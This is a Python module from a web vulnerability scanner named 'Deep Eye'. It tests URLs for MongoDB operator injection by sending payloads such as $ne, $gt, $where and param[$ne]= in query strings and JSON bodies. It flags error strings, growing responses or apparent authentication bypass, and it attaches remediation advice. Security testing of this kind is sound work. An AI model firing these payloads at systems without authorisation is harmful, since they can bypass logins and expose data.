"""
NoSQL Injection Tester Module for Deep Eye.

Tests for MongoDB operator injection vulnerabilities via JSON body and query parameters.
"""

import json
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from utils.logger import get_logger

logger = get_logger(__name__)


class NoSQLInjectionTester:
    """Tests for NoSQL injection vulnerabilities, primarily targeting MongoDB."""

    MONGO_OPERATORS = [
        {"$gt": ""},
        {"$ne": ""},
        {"$where": "1==1"},
        {"$regex": ".*"},
        {"$exists": True},
        {"$gt": None},
        {"$ne": None},
        {"$or": [{"a": "a"}, {"b": "b"}]},
    ]

    QUERY_PAYLOADS = [
        '{"$gt":""}',
        '{"$ne":""}',
        '{"$where":"1==1"}',
        '{"$regex":".*"}',
        '{"$exists":true}',
        "[$ne]=",
        "[$gt]=",
        "[$regex]=.*",
    ]

    ERROR_INDICATORS = [
        "MongoError",
        "$err",
        "mongo",
        "MongoDB",
        "BSON",
        "ObjectId",
        "MongoClient",
        "pymongo",
        "mongoose",
        "DocumentNotFound",
        "CastError",
        "ValidationError",
        "BSONTypeError",
    ]

    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config
        self.timeout = config.get("scanner", {}).get("timeout", 10)

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        """
        Scan a URL for NoSQL injection vulnerabilities.

        Args:
            url: Target URL to test.
            context: Optional context with parameters, technology info, etc.

        Returns:
            List of vulnerability dictionaries.
        """
        vulnerabilities = []
        context = context or {}

        logger.info(f"[NoSQLi] Testing: {url}")

        # Get baseline response
        baseline = self._get_baseline(url)
        if baseline is None:
            logger.debug(f"[NoSQLi] Could not get baseline for {url}, skipping")
            return vulnerabilities

        # Test query parameter injection
        vulns = self._test_query_params(url, baseline)
        vulnerabilities.extend(vulns)

        # Test JSON body injection
        vulns = self._test_json_body(url, baseline, context)
        vulnerabilities.extend(vulns)

        logger.info(f"[NoSQLi] Found {len(vulnerabilities)} potential issues on {url}")
        return vulnerabilities

    def _get_baseline(self, url: str) -> Optional[Dict]:
        """Get baseline response for comparison."""
        try:
            response = self.http_client.get(url, timeout=self.timeout)
            if response is None:
                return None
            return {
                "status_code": response.status_code,
                "content_length": len(response.text),
                "text": response.text,
            }
        except Exception as e:
            logger.debug(f"[NoSQLi] Baseline request failed: {e}")
            return None

    def _test_query_params(self, url: str, baseline: Dict) -> List[Dict]:
        """Test NoSQL injection via query parameters."""
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return vulnerabilities

        for param_name in params:
            for payload in self.QUERY_PAYLOADS:
                injected_url = self._inject_query_param(url, param_name, payload)
                result = self._send_and_analyze(injected_url, baseline, param_name, payload)
                if result:
                    vulnerabilities.append(result)
                    break  # One finding per parameter is enough

            # Test array-style injection: param[$ne]=
            array_url = self._inject_array_operator(url, param_name)
            if array_url:
                result = self._send_and_analyze(array_url, baseline, param_name, f"{param_name}[$ne]=")
                if result:
                    vulnerabilities.append(result)

        return vulnerabilities

    def _test_json_body(self, url: str, baseline: Dict, context: Dict) -> List[Dict]:
        """Test NoSQL injection via JSON body."""
        vulnerabilities = []

        # Determine fields to test from context or use defaults
        fields = context.get("parameters", ["username", "password", "email", "id", "query"])

        for field in fields:
            for operator in self.MONGO_OPERATORS:
                payload_body = {field: operator}
                try:
                    response = self.http_client.post(
                        url,
                        json=payload_body,
                        timeout=self.timeout,
                    )
                    if response is None:
                        continue

                    evidence = self._detect_nosql_indicators(response, baseline)
                    if evidence:
                        vulnerabilities.append({
                            "type": "nosql_injection",
                            "severity": "high",
                            "url": url,
                            "parameter": field,
                            "payload": json.dumps(payload_body),
                            "evidence": evidence,
                            "description": (
                                f"NoSQL injection detected via JSON body parameter '{field}'. "
                                f"MongoDB operator injection allows authentication bypass or data extraction."
                            ),
                            "remediation": (
                                "Validate and sanitize all user inputs. Use parameterized queries or ODM methods "
                                "that prevent operator injection. Reject objects where strings are expected. "
                                "Implement input type checking on the server side."
                            ),
                        })
                        break  # One finding per field
                except Exception as e:
                    logger.debug(f"[NoSQLi] JSON body test error: {e}")

        return vulnerabilities

    def _inject_query_param(self, url: str, param: str, payload: str) -> str:
        """Inject a payload into a specific query parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _inject_array_operator(self, url: str, param: str) -> Optional[str]:
        """Inject MongoDB array-style operator into query string."""
        parsed = urlparse(url)
        # Build param[$ne]= style injection
        operator_param = f"{param}[$ne]"
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[operator_param] = [""]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _send_and_analyze(self, url: str, baseline: Dict, param: str, payload: str) -> Optional[Dict]:
        """Send request and analyze response for NoSQL injection indicators."""
        try:
            response = self.http_client.get(url, timeout=self.timeout)
            if response is None:
                return None

            evidence = self._detect_nosql_indicators(response, baseline)
            if evidence:
                return {
                    "type": "nosql_injection",
                    "severity": "high",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": evidence,
                    "description": (
                        f"NoSQL injection detected via query parameter '{param}'. "
                        f"MongoDB operator injection may allow authentication bypass or data exfiltration."
                    ),
                    "remediation": (
                        "Sanitize query parameters and reject unexpected types. "
                        "Use allowlists for expected parameter values. "
                        "Implement server-side type validation before database queries."
                    ),
                }
        except Exception as e:
            logger.debug(f"[NoSQLi] Request error: {e}")
        return None

    def _detect_nosql_indicators(self, response, baseline: Dict) -> Optional[str]:
        """Detect NoSQL injection indicators in the response."""
        indicators = []

        # Check for MongoDB error messages
        response_text = response.text.lower()
        for error in self.ERROR_INDICATORS:
            if error.lower() in response_text:
                indicators.append(f"Error message found: '{error}'")

        # Check for significant content length difference (possible data leak)
        current_length = len(response.text)
        baseline_length = baseline["content_length"]
        if baseline_length > 0:
            diff_ratio = abs(current_length - baseline_length) / baseline_length
            if diff_ratio > 0.5 and current_length > baseline_length:
                indicators.append(
                    f"Significant response size increase: {baseline_length} -> {current_length} bytes"
                )

        # Check for authentication bypass (200 where baseline was 401/403)
        if baseline["status_code"] in (401, 403) and response.status_code == 200:
            indicators.append(
                f"Possible auth bypass: status changed from {baseline['status_code']} to 200"
            )

        if indicators:
            return "; ".join(indicators)
        return None
